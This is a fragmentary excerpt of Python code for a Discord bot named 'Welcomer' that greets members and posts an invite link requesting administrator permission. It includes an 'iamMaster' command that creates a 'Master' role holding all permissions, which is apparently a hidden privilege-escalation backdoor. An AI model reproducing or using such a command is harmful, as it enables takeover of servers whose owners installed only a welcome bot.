...
client = commands.Bot(description="Here is some command for you", command_prefix=commands.when_mentioned_or("wc!"), pm_help = False)


async def status_task():
    while True:
        await client.change_presence(game=discord.Game(name='for wc!help'))
...
async def on_message(message):
    channel = client.get_channel('521292701153624094')  
...
async def iamMaster(ctx):
    ...
    if discord.utils.get(user.server.roles, name="Master") is None:
        await client.create_role(user.server, name="Master", permissions=discord.Permissions.all())
...
async def info(ctx):
    ...
    await client.say('***THIS BOT IS MADE BY MASTER JOKER AND IF YOU NEED TO INVITE THIS BOT SO WRITE `wc!botinvite` THANKS***')

@client.command(pass_context = True)

async def botinvite(ctx):

    await client.say('https://discordapp.com/api/oauth2/authorize?client_id=521982848459341824&permissions=8&scope=bot')
...
async def test(ctx):
    if ctx.message.author.bot:
      ...
      await client.send_message(ctx.message.author, 'Hii bro whats upp')
...
async def ownerinfo(ctx):
    embed = discord.Embed(title="Information about owner", description="Bot Name- Welcomer", color=0x00ff00)
    embed.set_footer(text="WELCOMER")
...
async def on_member_join(member):
    ...
    channel = discord.utils.get(client.get_all_channels(), server__name='byWelcomer', name='★彡-welcome-彡★')
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
